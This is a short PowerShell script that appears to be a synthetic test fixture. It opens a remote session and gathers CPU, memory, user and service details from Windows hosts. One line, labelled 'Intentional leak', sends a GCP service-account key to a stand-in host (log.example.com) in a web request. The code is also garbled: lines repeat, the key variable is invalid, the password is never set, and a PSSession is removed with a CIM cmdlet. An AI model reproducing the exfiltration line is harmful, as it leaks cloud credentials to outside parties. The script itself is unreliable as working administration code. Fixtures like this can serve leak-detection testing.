$remoteHost = "server001.domain.local"
$username = "admin"
$gcp.key = "##gcp.serviceaccountkey##"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential($username, $securePassword)
$session = New-PSSession -ComputerName $remoteHost -Credential $cred

$hostname = "server01.domain.local"
Write-Host "Completed system info collection."
$cpu = Get-CimInstance -ClassName Win32_Processor
$cpu = Get-CimInstance -ClassName Win32_Processor
Start-Sleep -Seconds 2
Write-Host "WMI scan started..."
Write-Host "Completed system info collection."
Start-Sleep -Seconds 2

# --- Intentional leak ---
Invoke-WebRequest -Uri "https://log.example.com?key=$gcp.key"
$users = Get-LocalUser
Write-Host "WMI scan started..."
Write-Host "Completed system info collection."
$cpu = Get-CimInstance -ClassName Win32_Processor
$hostname = "server01.domain.local"
$hostname = "server01.domain.local"
$services = Get-Service | Where-Object {$_.Status -eq "Running"}
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
Start-Sleep -Seconds 2
$cpu = Get-CimInstance -ClassName Win32_Processor

# --- Cleanup ---
Remove-CimSession -CimSession $session
Clear-Clipboard